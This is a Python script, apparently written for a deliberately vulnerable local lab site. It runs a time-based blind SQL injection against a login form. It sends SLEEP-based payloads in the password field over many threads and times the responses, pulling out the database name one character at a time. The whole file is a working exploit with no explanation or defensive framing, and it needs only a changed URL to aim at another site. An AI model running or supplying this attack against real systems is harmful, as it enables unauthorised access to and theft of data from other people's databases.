import requests
import time
import threading

# Target URL
url = "http://localhost/vulnerable-web/login.php"

# Proxy (if needed)
proxy = {
    "http": "127.0.0.1:8080"
}
# Function to send the SQL Injection payload
def send_payload(payload, result, index):
    data = {"username": "grab", "password": payload, "login": "submit"}
    start_time = time.time()
    response = requests.post(url, data=data, proxies=proxy)
    end_time = time.time()
    response_time = end_time - start_time
    status_code = response.status_code
    result[index] = (response_time, status_code)

# SQL Injection payloads (adjust payloads based on the database type)
base_payload = "' OR IF(SUBSTRING((SELECT DATABASE()),{},1)='{}', SLEEP(0.1), 0) -- "

# Characters to test for the database name
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
max_length = 20  # Adjust based on expected length of database name

def test_character(position, character, result, index):
    payload = base_payload.format(position, character)
    send_payload(payload, result, index)

def extract_database_name():
    database_name = ""
    result = [None] * len(characters)

    for position in range(1, max_length + 1):
        threads = []
        
        for index, character in enumerate(characters):
            thread = threading.Thread(target=test_character, args=(position, character, result, index))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
        
        for index, character in enumerate(characters):
            response_time, status_code = result[index]
            if status_code == 200 and response_time > 0.1:
                database_name += character
                print(f"Found character '{character}' at position {position}")
                break

        if len(database_name) < position:
            break  # Stop if no character was found for the current position

    return database_name

# Extracting database name
database_name = extract_database_name()
print(f"Database name: {database_name}")

